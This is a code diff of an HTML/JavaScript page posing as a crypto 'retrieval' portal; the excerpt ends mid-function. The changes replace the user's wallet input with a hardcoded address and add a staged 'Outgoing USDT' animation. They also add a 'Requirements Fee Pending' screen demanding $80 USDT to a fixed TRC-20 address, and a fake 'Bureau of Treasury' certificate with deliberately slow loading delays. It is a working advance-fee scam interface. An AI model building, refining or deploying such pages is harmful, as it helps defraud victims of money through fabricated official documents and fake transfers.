@@ -11,15 +11,13 @@
       --gold: #b58a3b;
       --gold-dark: #8d6d1f;
       --gold-light: #e8d6a0;
-      --cream: #fbf7ed;
       --text: #201d1a;
       --muted: #6d6255;
       --border: #e1c88f;
-      --bg: #efeae2;
       --panel: rgba(255, 255, 255, 0.7);
-      --shadow: rgba(20, 22, 16, 0.18);
       --error: #b84242;
       --success: #2d6a4f;
+      --usdt: #26a17b;
     }
 
     * { box-sizing: border-box; }
@@ -45,7 +43,10 @@
       position: relative;
     }
 
-    .form-step {
+    .form-step,
+    .loading-screen,
+    .anim-screen,
+    .notify-screen {
       display: none;
       width: 100%;
       min-height: 720px;
@@ -58,19 +59,24 @@
       animation: slideUp 0.45s ease;
     }
 
-    .form-step.active {
-      display: block;
+    .form-step.active,
+    .loading-screen.active,
+    .anim-screen.active,
+    .notify-screen.active { display: block; }
+
+    .loading-screen.active,
+    .anim-screen.active {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 40px 24px;
     }
 
     @keyframes slideUp {
-      from {
-        opacity: 0;
-        transform: translateY(10px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
     .brand {
@@ -122,8 +128,7 @@
       line-height: 1.7;
     }
 
-    .code-input,
-    .wallet-input {
+    .code-input {
       width: 100%;
       margin-top: 8px;
       border: 1px solid var(--border);
@@ -133,12 +138,11 @@
       padding: 16px 14px;
       font-size: 16px;
       outline: none;
-      transition: border-color 0.2s ease, box-shadow 0.2s ease;
       font-family: Arial, sans-serif;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
     }
 
-    .code-input:focus,
-    .wallet-input:focus {
+    .code-input:focus {
       border-color: var(--gold);
       box-shadow: 0 0 0 4px rgba(181,138,59,0.12);
     }
@@ -155,19 +159,12 @@
       padding: 16px 18px;
       font-weight: 700;
       cursor: pointer;
-      transition: transform 0.2s ease, box-shadow 0.2s ease, opacity 0.2s ease;
+      transition: transform 0.2s ease, opacity 0.2s ease;
       box-shadow: 0 10px 22px rgba(20,38,78,0.18);
     }
 
-    .primary-btn:hover:not(:disabled) {
-      transform: translateY(-1px);
-    }
-
-    .primary-btn:disabled {
-      opacity: 0.65;
-      cursor: not-allowed;
-      transform: none;
-    }
+    .primary-btn:hover:not(:disabled) { transform: translateY(-1px); }
+    .primary-btn:disabled { opacity: 0.65; cursor: not-allowed; transform: none; }
 
     .status-text {
       min-height: 22px;
@@ -177,10 +174,7 @@
       color: var(--error);
       font-family: Arial, sans-serif;
     }
-
-    .status-text.success {
-      color: var(--success);
-    }
+    .status-text.success { color: var(--success); }
 
     .tiny-note {
       margin-top: 12px;
@@ -190,82 +184,6 @@
       letter-spacing: 0.6px;
       text-transform: uppercase;
       font-family: Arial, sans-serif;
-    }
-
-    /* Loading screen */
-    .loading-screen {
-      display: none;
-      width: 100%;
-      min-height: 720px;
-      background: rgba(255,255,255,0.46);
-      border: 1px solid rgba(181,138,59,0.34);
-      border-radius: 26px;
-      box-shadow: 0 20px 45px rgba(22, 15, 8, 0.08);
-      backdrop-filter: blur(8px);
-      padding: 40px 24px;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-      animation: slideUp 0.45s ease;
-    }
-
-    .loading-screen.active {
-      display: flex;
-    }
-
-    .spinner {
-      width: 56px;
-      height: 56px;
-      border: 3px solid rgba(181,138,59,0.25);
-      border-top-color: var(--gold);
-      border-radius: 50%;
-      animation: spin 0.9s linear infinite;
-      margin-bottom: 24px;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .loading-title {
-      margin: 0 0 10px;
-      color: var(--navy);
-      font-size: 22px;
-      letter-spacing: 0.5px;
-    }
-
-    .loading-subtitle {
-      margin: 0 0 28px;
-      color: var(--muted);
-      font-size: 14px;
-      line-height: 1.6;
-      max-width: 280px;
-    }
-
-    .progress-track {
-      width: 100%;
-      max-width: 260px;
-      height: 6px;
-      background: rgba(181,138,59,0.2);
-      border-radius: 99px;
-      overflow: hidden;
-    }
-
-    .progress-bar {
-      height: 100%;
-      width: 0%;
-      background: linear-gradient(90deg, var(--gold), #d8ba69);
-      border-radius: 99px;
-      transition: width 0.15s linear;
-    }
-
-    .loading-percent {
-      margin-top: 12px;
-      font-family: Arial, sans-serif;
-      font-size: 12px;
-      color: var(--muted);
-      letter-spacing: 1px;
     }
 
     .wallet-label {
@@ -279,6 +197,411 @@
       font-weight: 700;
     }
 
+    /* Confirm wallet */
+    .confirm-wallet-box {
+      margin: 8px 0 4px;
+      padding: 16px 14px;
+      border-radius: 16px;
+      background: rgba(20, 38, 78, 0.04);
+      border: 1px solid rgba(20, 38, 78, 0.12);
+    }
+
+    .confirm-wallet-network {
+      display: inline-block;
+      margin-bottom: 10px;
+      padding: 5px 10px;
+      border-radius: 99px;
+      background: rgba(38, 161, 123, 0.12);
+      border: 1px solid rgba(38, 161, 123, 0.3);
+      color: var(--usdt);
+      font-family: Arial, sans-serif;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.6px;
+      text-transform: uppercase;
+    }
+
+    .confirm-wallet-address {
+      font-family: "Courier New", Courier, monospace;
+      font-size: 13px;
+      color: var(--navy);
+      word-break: break-all;
+      line-height: 1.55;
+      user-select: all;
+    }
+
+    .confirm-hint {
+      margin: 14px 0 0;
+      color: var(--muted);
+      font-size: 13px;
+      line-height: 1.6;
+      text-align: center;
+    }
+
+    /* Loading — circle only, no numbers */
+    .spinner {
+      width: 64px;
+      height: 64px;
+      border: 3px solid rgba(181,138,59,0.22);
+      border-top-color: var(--gold);
+      border-radius: 50%;
+      animation: spin 1.15s linear infinite;
+      margin-bottom: 28px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .loading-title {
+      margin: 0 0 10px;
+      color: var(--navy);
+      font-size: 22px;
+    }
+    .loading-subtitle {
+      margin: 0;
+      color: var(--muted);
+      font-size: 14px;
+      line-height: 1.6;
+      max-width: 280px;
+    }
+
+    /* Outgoing USDT */
+    .tx-stage {
+      position: relative;
+      width: 100%;
+      max-width: 320px;
+      height: 220px;
+      margin-bottom: 20px;
+    }
+
+    .wallet-node {
+      position: absolute;
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      display: grid;
+      place-items: center;
+      font-family: Arial, sans-serif;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      color: #fff;
+      box-shadow: 0 10px 24px rgba(0,0,0,0.12);
+      z-index: 2;
+    }
+
+    .wallet-node.from {
+      left: 8px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: linear-gradient(135deg, var(--navy), #1d335d);
+    }
+
+    .wallet-node.to {
+      right: 8px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: linear-gradient(135deg, var(--usdt), #1a7a5c);
+    }
+
+    .wallet-node span {
+      font-size: 20px;
+      line-height: 1;
+      margin-bottom: 2px;
+    }
+
+    .tx-path {
+      position: absolute;
+      left: 80px;
+      right: 80px;
+      top: 50%;
+      height: 3px;
+      background: linear-gradient(90deg, rgba(38,161,123,0.2), rgba(38,161,123,0.5), rgba(38,161,123,0.2));
+      border-radius: 99px;
+      transform: translateY(-50%);
+    }
+
+    .usdt-coin {
+      position: absolute;
+      width: 42px;
+      height: 42px;
+      border-radius: 50%;
+      background: linear-gradient(145deg, #2ecf96, #26a17b 50%, #1a7a5c);
+      border: 2px solid #e8fff6;
+      box-shadow: 0 0 0 4px rgba(38,161,123,0.2), 0 8px 20px rgba(38,161,123,0.35);
+      display: grid;
+      place-items: center;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      font-weight: 800;
+      font-size: 13px;
+      left: 0;
+      top: 50%;
+      margin-top: -21px;
+      opacity: 0;
+      z-index: 3;
+    }
+
+    .usdt-coin.animate {
+      animation: sendUsdt 3.4s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+    }
+
+    @keyframes sendUsdt {
+      0% { left: 0%; opacity: 0; transform: scale(0.6); }
+      12% { opacity: 1; transform: scale(1); }
+      50% { transform: scale(1.08); }
+      88% { opacity: 1; transform: scale(1); }
+      100% { left: calc(100% - 42px); opacity: 0.9; transform: scale(0.95); }
+    }
+
+    .tx-trail {
+      position: absolute;
+      left: 0;
+      top: 50%;
+      height: 3px;
+      width: 0%;
+      margin-top: -1.5px;
+      background: linear-gradient(90deg, transparent, var(--usdt));
+      border-radius: 99px;
+      box-shadow: 0 0 12px rgba(38,161,123,0.5);
+    }
+
+    .tx-trail.animate {
+      animation: trailGrow 3.4s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+    }
+
+    @keyframes trailGrow { to { width: 100%; } }
+
+    .tx-amount-badge {
+      display: inline-flex;
+      margin-top: 8px;
+      padding: 10px 18px;
+      border-radius: 99px;
+      background: rgba(38,161,123,0.1);
+      border: 1px solid rgba(38,161,123,0.35);
+      color: var(--usdt);
+      font-family: Arial, sans-serif;
+      font-size: 15px;
+      font-weight: 700;
+      opacity: 0;
+      transform: translateY(8px);
+    }
+
+    .tx-amount-badge.show {
+      animation: fadeUp 0.5s ease 0.3s forwards;
+    }
+
+    @keyframes fadeUp {
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .anim-title {
+      margin: 0 0 6px;
+      color: var(--navy);
+      font-size: 20px;
+    }
+    .anim-sub {
+      margin: 0 0 8px;
+      color: var(--muted);
+      font-size: 13px;
+      line-height: 1.5;
+      max-width: 280px;
+    }
+
+    /* Multi-sig notification */
+    .notify-screen { padding: 24px 18px 22px; }
+
+    .notify-card {
+      background: var(--panel);
+      border: 1px solid rgba(181,138,59,0.45);
+      border-radius: 22px;
+      overflow: hidden;
+      box-shadow: 0 12px 32px rgba(22,15,8,0.08);
+    }
+
+    .notify-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 16px 18px;
+      background: linear-gradient(135deg, rgba(20,38,78,0.06), rgba(181,138,59,0.12));
+      border-bottom: 1px solid rgba(181,138,59,0.25);
+    }
+
+    .notify-icon {
+      width: 44px;
+      height: 44px;
+      border-radius: 12px;
+      background: linear-gradient(135deg, var(--navy), #1d335d);
+      color: #f2d38a;
+      display: grid;
+      place-items: center;
+      font-size: 20px;
+      flex-shrink: 0;
+    }
+
+    .notify-header-text h3 {
+      margin: 0;
+      font-size: 14px;
+      color: var(--navy);
+    }
+    .notify-header-text p {
+      margin: 4px 0 0;
+      font-size: 11px;
+      color: var(--muted);
+      font-family: Arial, sans-serif;
+      text-transform: uppercase;
+      letter-spacing: 0.4px;
+    }
+
+    .notify-body { padding: 20px 18px 18px; }
+
+    .notify-badge {
+      display: inline-block;
+      margin-bottom: 14px;
+      padding: 6px 12px;
+      border-radius: 99px;
+      background: rgba(184,66,66,0.1);
+      border: 1px solid rgba(184,66,66,0.3);
+      color: var(--error);
+      font-family: Arial, sans-serif;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.8px;
+      text-transform: uppercase;
+    }
+
+    .notify-title {
+      margin: 0 0 10px;
+      color: var(--navy);
+      font-size: 20px;
+      line-height: 1.3;
+    }
+
+    .notify-desc {
+      margin: 0 0 18px;
+      color: var(--muted);
+      font-size: 13px;
+      line-height: 1.7;
+    }
+
+    .fee-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 14px 16px;
+      margin-bottom: 14px;
+      border-radius: 14px;
+      background: linear-gradient(135deg, #fffdf7, #f3e7c9);
+      border: 1px solid rgba(181,138,59,0.4);
+    }
+
+    .fee-row-label {
+      font-family: Arial, sans-serif;
+      font-size: 12px;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.6px;
+    }
+
+    .fee-row-value {
+      color: var(--navy);
+      font-size: 22px;
+      font-weight: 700;
+    }
+
+    .pay-address-box {
+      padding: 14px 14px 12px;
+      border-radius: 14px;
+      background: rgba(20,38,78,0.04);
+      border: 1px dashed rgba(20,38,78,0.2);
+      margin-bottom: 16px;
+    }
+
+    .pay-address-label {
+      display: block;
+      margin-bottom: 8px;
+      font-family: Arial, sans-serif;
+      font-size: 11px;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.6px;
+    }
+
+    .pay-address {
+      font-family: "Courier New", Courier, monospace;
+      font-size: 12px;
+      color: var(--navy);
+      word-break: break-all;
+      line-height: 1.5;
+      user-select: all;
+    }
+
+    .copy-btn {
+      margin-top: 10px;
+      width: 100%;
+      border: 1px solid rgba(181,138,59,0.5);
+      border-radius: 10px;
+      background: rgba(255,255,255,0.85);
+      color: var(--navy);
+      font-family: Arial, sans-serif;
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      padding: 10px;
+      cursor: pointer;
+    }
+    .copy-btn:hover { background: #fff; }
+
+    .msig-steps {
+      list-style: none;
+      margin: 0 0 18px;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      font-size: 12px;
+      color: var(--text);
+    }
+
+    .msig-steps li {
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+      margin-bottom: 10px;
+      line-height: 1.5;
+    }
+
+    .msig-steps .step-num {
+      flex-shrink: 0;
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background: var(--navy);
+      color: #f2d38a;
+      display: grid;
+      place-items: center;
+      font-size: 11px;
+      font-weight: 700;
+    }
+
+    .notify-actions {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .primary-btn.confirm {
+      margin-top: 0;
+      background: linear-gradient(135deg, var(--usdt), #1a7a5c);
+      box-shadow: 0 10px 22px rgba(38,161,123,0.25);
+    }
+
+    .secondary-note {
+      text-align: center;
+      font-family: Arial, sans-serif;
+      font-size: 11px;
+      color: var(--muted);
+      line-height: 1.5;
+    }
+
+    /* Certificate */
     .certificate-screen {
       padding: 0;
       overflow: hidden;
@@ -313,11 +636,7 @@
       line-height: 1.8;
       letter-spacing: 0.4px;
     }
-
-    .issuer strong {
-      display: block;
-      font-size: 11px;
-    }
+    .issuer strong { display: block; font-size: 11px; }
 
     .emblem {
       display: grid;
@@ -348,9 +667,7 @@
       background: linear-gradient(to right, transparent, var(--gold), transparent);
     }
 
-    .recipient-section {
-      text-align: center;
-    }
+    .recipient-section { text-align: center; }
 
     .recipient-label {
       margin: 0 0 8px;
@@ -363,8 +680,10 @@
     .recipient-name {
       margin: 0 0 10px;
       color: var(--navy);
-      font-size: clamp(22px, 5vw, 28px);
-      word-break: break-word;
+      font-size: clamp(18px, 4.5vw, 24px);
+      word-break: break-all;
+      font-family: "Courier New", Courier, monospace;
+      line-height: 1.4;
     }
 
     .description {
@@ -395,7 +714,6 @@
       margin: 0;
       font-size: clamp(26px, 7vw, 40px);
       line-height: 1.2;
-      overflow-wrap: anywhere;
     }
 
     .currency-label {
@@ -442,9 +760,7 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
       gap: 8px;
-      min-width: 0;
       text-align: center;
     }
 
@@ -459,12 +775,10 @@
       color: var(--navy);
       font-size: 20px;
     }
-
     .seal:nth-child(2) .seal-icon {
       border: 3px double var(--gold);
       color: #98701f;
     }
-
     .seal:nth-child(3) .seal-icon {
       background: var(--navy);
       color: #f2d38a;
@@ -540,121 +854,174 @@
       font-size: 11px;
       word-break: break-all;
     }
-
     .wallet-display.show { display: block; }
 
     @media (min-width: 768px) {
-      .app-shell {
-        width: min(100%, 900px);
-      }
-
+      .app-shell { width: min(100%, 900px); }
       .certificate-screen,
-      .loading-screen {
-        min-height: 860px;
-      }
-
+      .loading-screen,
+      .anim-screen,
+      .notify-screen { min-height: 860px; }
       .certificate-page {
         min-height: 860px;
         padding: 24px 22px 20px;
       }
-
-      .certificate-header {
-        gap: 18px;
-      }
-
-      .issuer {
-        font-size: 11px;
-      }
-
-      .emblem {
-        width: 82px;
-        font-size: 30px;
-      }
+      .emblem { width: 82px; font-size: 30px; }
+      .issuer { font-size: 11px; }
     }
   </style>
 </head>
 <body>
   <div class="app-shell">
-    <!-- Step 1: Passcode -->
+
+    <!-- 1. Passcode -->
     <section class="form-step active" id="step-lock">
       <div class="brand">
         <span class="brand-badge">↗️</span>
         <span>Connect Retrieval</span>
       </div>
-
       <div class="secure-box">
         <h1 class="secure-title">Secure Access</h1>
         <p class="secure-subtitle">
           Enter your secure passcode to continue with the retrieval process.
         </p>
-
         <label for="passcodeInput" class="wallet-label">Passcode</label>
-        <input
-          id="passcodeInput"
-          class="code-input"
-          type="password"
-          maxlength="4"
-          placeholder="Enter passcode"
-          autocomplete="off"
-        />
-
+        <input id="passcodeInput" class="code-input" type="password" maxlength="4" placeholder="Enter passcode" autocomplete="off" />
         <button id="unlockBtn" class="primary-btn">Unlock Access</button>
         <div id="lockStatus" class="status-text" aria-live="polite"></div>
         <div class="tiny-note">Authorized retrieval portal</div>
       </div>
     </section>
 
-    <!-- Loading: after passcode -->
+    <!-- Loading: auth (slow, circle only) -->
     <section class="loading-screen" id="loading-auth">
       <div class="spinner" aria-hidden="true"></div>
       <h2 class="loading-title">Verifying Access</h2>
       <p class="loading-subtitle">Authenticating credentials and preparing secure session…</p>
-      <div class="progress-track">
-        <div class="progress-bar" id="progressAuth"></div>
-      </div>
-      <div class="loading-percent" id="percentAuth">0%</div>
     </section>
 
-    <!-- Step 2: Wallet (no fee shown) -->
+    <!-- 2. Confirm fixed USDT TRC-20 wallet -->
     <section class="form-step" id="step-wallet">
       <div class="brand">
         <span class="brand-badge">◎</span>
         <span>Professional Retrieval</span>
       </div>
-
       <div class="secure-box">
-        <h2 class="secure-title">Wallet Verification</h2>
+        <h2 class="secure-title">Confirm Wallet</h2>
         <p class="secure-subtitle">
-          Please enter your valid USDT or TRX wallet address to proceed.
+          Please confirm this USDT TRC-20 wallet address to proceed.
         </p>
 
-        <label for="walletInput" class="wallet-label">USDT / TRX Wallet</label>
-        <input
-          id="walletInput"
-          class="wallet-input"
-          type="text"
-          placeholder="TRX or USDT wallet address"
-          autocomplete="off"
-        />
+        <div class="confirm-wallet-box">
+          <span class="confirm-wallet-network">USDT · TRC-20</span>
+          <div class="confirm-wallet-address" id="confirmWalletAddr">TUAVAdUQ5R569CSD5jn3mbUtszXLn6ovM3</div>
+        </div>
 
-        <button id="submitBtn" class="primary-btn">Submit &amp; Generate Certificate</button>
+        <p class="confirm-hint">
+          This is the registered retrieval wallet. Confirm only if this address is correct.
+        </p>
+
+        <button id="submitBtn" class="primary-btn">Confirm Wallet &amp; Continue</button>
         <div id="walletStatus" class="status-text" aria-live="polite"></div>
         <div class="tiny-note">Secure verification in progress</div>
       </div>
     </section>
 
-    <!-- Loading: after wallet submit -->
+    <!-- Loading: validate (slow, circle only) -->
+    <section class="loading-screen" id="loading-validate">
+      <div class="spinner" aria-hidden="true"></div>
+      <h2 class="loading-title">Validating Wallet</h2>
+      <p class="loading-subtitle">Checking TRC-20 address and preparing multi-signature session…</p>
+    </section>
+
+    <!-- 3. Outgoing USDT animation -->
+    <section class="anim-screen" id="step-outgoing">
+      <div class="brand" style="margin-bottom: 28px;">
+        <span class="brand-badge">◎</span>
+        <span>Secure Transfer</span>
+      </div>
+      <h2 class="anim-title">Outgoing USDT</h2>
+      <p class="anim-sub">Initiating multi-signature approval transfer…</p>
+
+      <div class="tx-stage">
+        <div class="wallet-node from"><span>◎</span>You</div>
+        <div class="tx-path">
+          <div class="tx-trail" id="txTrail"></div>
+          <div class="usdt-coin" id="usdtCoin">₮</div>
+        </div>
+        <div class="wallet-node to"><span>✓</span>MSIG</div>
+      </div>
+
+      <div class="tx-amount-badge" id="txBadge">$80 USDT</div>
+      <p class="anim-sub" style="margin-top: 16px;" id="txStatusText">Preparing network broadcast…</p>
+    </section>
+
+    <!-- 4. Multi-sig notification -->
+    <section class="notify-screen" id="step-notify">
+      <div class="brand">
+        <span class="brand-badge">◈</span>
+        <span>Multi-Signature</span>
+      </div>
+
+      <div class="notify-card">
+        <div class="notify-header">
+          <div class="notify-icon">⚠</div>
+          <div class="notify-header-text">
+            <h3>Action Required</h3>
+            <p>System notification</p>
+          </div>
+        </div>
+
+        <div class="notify-body">
+          <span class="notify-badge">Multi-Signature Approval</span>
+          <h2 class="notify-title">Requirements Fee Pending</h2>
+          <p class="notify-desc">
+            Your retrieval certificate requires multi-signature approval.
+            Complete the requirements fee transfer to unlock final certification.
+          </p>
+
+          <div class="fee-row">
+            <span class="fee-row-label">Requirements Fee</span>
+            <span class="fee-row-value">$80 USDT</span>
+          </div>
+
+          <div class="pay-address-box">
+            <span class="pay-address-label">Pay to (TRC-20 / USDT)</span>
+            <div class="pay-address" id="payAddress">TQzqzQNsGVDsChQFJsB61aKm7Dx1giC72y</div>
+            <button type="button" class="copy-btn" id="copyAddrBtn">Copy Address</button>
+          </div>
+
+          <ul class="msig-steps">
+            <li>
+              <span class="step-num">1</span>
+              <span>Send exactly <strong>$80 USDT</strong> (TRC-20) to the address above.</span>
+            </li>
+            <li>
+              <span class="step-num">2</span>
+              <span>Multi-signature co-signers will verify the incoming transfer.</span>
+            </li>
+            <li>
+              <span class="step-num">3</span>
+              <span>After confirmation, your certificate of funds will be released.</span>
+            </li>
+          </ul>
+
+          <div class="notify-actions">
+            <button id="confirmPaidBtn" class="primary-btn confirm">I Have Completed Payment</button>
+            <p class="secondary-note">Only proceed after the $80 USDT transfer is sent from your wallet.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Loading: certificate (slow, circle only) -->
     <section class="loading-screen" id="loading-cert">
       <div class="spinner" aria-hidden="true"></div>
       <h2 class="loading-title">Generating Certificate</h2>
-      <p class="loading-subtitle">Validating wallet and preparing official retrieval record…</p>
-      <div class="progress-track">
-        <div class="progress-bar" id="progressCert"></div>
-      </div>
-      <div class="loading-percent" id="percentCert">0%</div>
+      <p class="loading-subtitle">Confirming multi-signature approval and preparing official record…</p>
     </section>
 
-    <!-- Step 3: Certificate (fee shown only here) -->
+    <!-- 5. Certificate -->
     <section class="form-step certificate-screen" id="step-certificate">
       <main class="certificate-page">
         <header class="certificate-header">
@@ -663,9 +1030,8 @@
             DEPARTMENT OF FINANCE<br>
             BUREAU OF TREASURY
           </div>
-
-          <div class="emblem" aria-label="Decorative emblem">✦</div>
-          <div class="emblem" aria-label="Decorative seal">❖</div>
+          <div class="emblem">✦</div>
+          <div class="emblem">❖</div>
         </header>
 
         <section>
@@ -675,7 +1041,7 @@
 
         <section class="recipient-section">
           <p class="recipient-label">Presented to</p>
-          <h2 id="certificateWalletName" class="recipient-name">Wallet Holder</h2>
+          <h2 id="certificateWalletName" class="recipient-name">TUAVAdUQ5R569CSD5jn3mbUtszXLn6ovM3</h2>
           <p class="description">
             This certificate formally confirms the retrieval record and verified holding of
             <strong>Eighty USDT</strong> (<strong>$80 USDT</strong>) in a secure and professionally acknowledged format.
@@ -687,7 +1053,6 @@
             <h2 class="amount">$80 USDT</h2>
             <p class="currency-label">Verified Holding</p>
           </div>
-
           <div class="portrait-frame">
             <img class="portrait" src="IMG-20261023-WA0002.jpg" alt="Recipient portrait" />
           </div>
@@ -695,27 +1060,27 @@
 
         <p class="status-text-cert">
           Verified retrieval record<br>
-          Confirmed for secure documentation and presentation
+          Multi-signature approval confirmed
         </p>
 
         <section class="seals">
           <div class="seal">
-            <div class="seal-icon" aria-hidden="true">◎</div>
+            <div class="seal-icon">◎</div>
             <h3 class="seal-title">Verified<br>Assurance</h3>
           </div>
-
           <div class="seal">
-            <div class="seal-icon" aria-hidden="true">♜</div>
+            <div class="seal-icon">♜</div>
             <h3 class="seal-title">Trusted<br>Recognition</h3>
           </div>
-
           <div class="seal">
-            <div class="seal-icon" aria-hidden="true">◇</div>
+            <div class="seal-icon">◇</div>
             <h3 class="seal-title">Secure<br>Record</h3>
           </div>
         </section>
 
-        <div id="walletDisplay" class="wallet-display"></div>
+        <div id="walletDisplay" class="wallet-display show">
+          Wallet Address: TUAVAdUQ5R569CSD5jn3mbUtszXLn6ovM3
+        </div>
 
         <section class="signature-row">
           <div class="signature-field">Signature</div>
@@ -726,7 +1091,7 @@
           <h2 class="footer-heading">VERIFIED CERTIFICATE</h2>
           <p class="footer-copy">
             This document is provided as a professional digital record for verified retrieval and acknowledgment.
-            It reflects a formal holding reference and secure retrieval process, with the loading fee set at $80 USDT.
+            It reflects a formal holding reference and secure retrieval process, with the requirements fee set at $80 USDT.
           </p>
           <div class="disclaimer">FINANCIAL DOCUMENT</div>
         </footer>
@@ -735,30 +1100,45 @@
   </div>
 
   <script>
+    const correctPasscode = '8804';
+    const CONFIRM_WALLET = 'TUAVAdUQ5R569CSD5jn3mbUtszXLn6ovM3';
+    const PAY_ADDRESS = 'TQzqzQNsGVDsChQFJsB61aKm7Dx1giC72y';
+
+    /* Slow load times (ms) */
+    const LOAD_AUTH_MS = 4500;
+    const LOAD_VALIDATE_MS = 5200;
+    const LOAD_CERT_MS = 5800;
+    const OUTGOING_MS = 3800;
+
     const passcodeInput = document.getElementById('passcodeInput');
     const unlockBtn = document.getElementById('unlockBtn');
     const lockStatus = document.getElementById('lockStatus');
-    const walletInput = document.getElementById('walletInput');
     const submitBtn = document.getElementById('submitBtn');
     const walletStatus = document.getElementById('walletStatus');
+    const confirmPaidBtn = document.getElementById('confirmPaidBtn');
+    const copyAddrBtn = document.getElementById('copyAddrBtn');
+
     const stepLock = document.getElementById('step-lock');
     const stepWallet = document.getElementById('step-wallet');
+    const stepOutgoing = document.getElementById('step-outgoing');
+    const stepNotify = document.getElementById('step-notify');
     const stepCertificate = document.getElementById('step-certificate');
     const loadingAuth = document.getElementById('loading-auth');
+    const loadingValidate = document.getElementById('loading-validate');
     const loadingCert = document.getElementById('loading-cert');
-    const certificateWalletName = document.getElementById('certificateWalletName');
-    const walletDisplay = document.getElementById('walletDisplay');
-    const progressAuth = document.getElementById('progressAuth');
-    const percentAuth = document.getElementById('percentAuth');
-    const progressCert = document.getElementById('progressCert');
-    const percentCert = document.getElementById('percentCert');
 
-    const correctPasscode = '8804';
+    const usdtCoin = document.getElementById('usdtCoin');
+    const txTrail = document.getElementById('txTrail');
+    const txBadge = document.getElementById('txBadge');
+    const txStatusText = document.getElementById('txStatusText');
+
+    const allSteps = [
+      stepLock, stepWallet, stepOutgoing, stepNotify, stepCertificate,
+      loadingAuth, loadingValidate, loadingCert
+    ];
 
     function hideAll() {
-      [stepLock, stepWallet, stepCertificate, loadingAuth, loadingCert].forEach((el) => {
-        el.classList.remove('active');
-      });
+      allSteps.forEach((el) => el.classList.remove('active'));
     }
 
     function showStep(el) {
@@ -766,38 +1146,39 @@
       el.classList.add('active');
     }
 
-    function runLoading(progressEl, percentEl, durationMs, onComplete) {
-      let start = null;
-      progressEl.style.width = '0%';
-      percentEl.textContent = '0%';
+    /* Slow wait — circle only, no numbers */
+    function slowLoad(durationMs, onComplete) {
+      setTimeout(onComplete, durationMs);
+    }
 
-      function frame(ts) {
-        if (!start) start = ts;
-        const elapsed = ts - start;
-        const pct = Math.min(100, Math.round((elapsed / durationMs) * 100));
-        progressEl.style.width = pct + '%';
-        percentEl.textContent = pct + '%';
-        if (pct < 100) {
-          requestAnimationFrame(frame);
-        } else {
-          setTimeout(onComplete, 200);
-        }
-      }
-      requestAnimationFrame(frame);
+    function playOutgoingAnimation(onComplete) {
+      usdtCoin.classList.remove('animate');
+      txTrail.classList.remove('animate');
+      txBadge.classList.remove('show');
+      void usdtCoin.offsetWidth;
+
+      txStatusText.textContent = 'Broadcasting outgoing USDT…';
+      usdtCoin.classList.add('animate');
+      txTrail.classList.add('animate');
+      txBadge.classList.add('show');
+
+      setTimeout(() => {
+        txStatusText.textContent = 'Transfer staged for multi-signature approval.';
+      }, 2400);
+
+      setTimeout(onComplete, OUTGOING_MS);
     }
 
     unlockBtn.addEventListener('click', () => {
       const value = passcodeInput.value.trim();
-
       if (value === correctPasscode) {
         lockStatus.textContent = 'Access approved.';
         lockStatus.classList.add('success');
         lockStatus.classList.remove('error');
         unlockBtn.disabled = true;
-
         setTimeout(() => {
           showStep(loadingAuth);
-          runLoading(progressAuth, percentAuth, 2200, () => {
+          slowLoad(LOAD_AUTH_MS, () => {
             showStep(stepWallet);
             passcodeInput.value = '';
             lockStatus.textContent = '';
@@ -817,33 +1198,40 @@
     });
 
     submitBtn.addEventListener('click', () => {
-      const wallet = walletInput.value.trim();
-
-      if (!wallet) {
-        walletStatus.textContent = 'Please enter your USDT or TRX wallet address.';
-        walletStatus.classList.remove('success');
-        walletStatus.classList.add('error');
-        walletInput.focus();
-        return;
-      }
-
-      walletStatus.textContent = '';
       submitBtn.disabled = true;
-
-      const displayName = wallet.length > 18 ? wallet.slice(0, 18) + '...' : wallet;
-      certificateWalletName.textContent = displayName;
-      walletDisplay.textContent = 'Wallet Address: ' + wallet;
-      walletDisplay.classList.add('show');
-
-      showStep(loadingCert);
-      runLoading(progressCert, percentCert, 2800, () => {
-        showStep(stepCertificate);
-        submitBtn.disabled = false;
+      walletStatus.textContent = '';
+      showStep(loadingValidate);
+      slowLoad(LOAD_VALIDATE_MS, () => {
+        showStep(stepOutgoing);
+        playOutgoingAnimation(() => {
+          showStep(stepNotify);
+          submitBtn.disabled = false;
+        });
       });
     });
 
-    walletInput.addEventListener('keydown', (e) => {
-      if (e.key === 'Enter') submitBtn.click();
+    copyAddrBtn.addEventListener('click', async () => {
+      try {
+        await navigator.clipboard.writeText(PAY_ADDRESS);
+        copyAddrBtn.textContent = 'Address Copied';
+        setTimeout(() => { copyAddrBtn.textContent = 'Copy Address'; }, 2000);
+      } catch {
+        const range = document.createRange();
+        range.selectNodeContents(document.getElementById('payAddress'));
+        const sel = window.getSelection();
+        sel.removeAllRanges();
+        sel.addRange(range);
